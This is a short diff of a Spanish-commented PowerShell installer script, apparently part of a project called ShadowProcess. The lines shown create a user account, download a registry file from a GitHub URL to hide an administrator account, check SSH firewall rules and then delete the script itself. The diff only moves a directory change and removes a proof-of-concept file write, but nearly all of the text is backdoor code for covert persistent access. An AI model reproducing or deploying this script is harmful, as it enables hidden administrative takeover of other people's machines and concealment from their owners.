@@ -40,8 +40,7 @@ create_account -uname $uname -pword $pword
 #ir al directorio en la carpeta %temp%, crear un archivo PoC.txt
 mkdir $path
 cd $path
-echo "" > poc.txt
-cd $initial_dir
+
 #registro para esconder administrador
 $reg_file = random_text 
 Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/resources/hu.reg -OutFile "$reg_file.reg"
@@ -63,5 +62,5 @@ Get-NetFirewallRule -Name *ssh*
 
 
 #autoeliminacion
-
+cd $initial_dir
 del .\installer.ps1
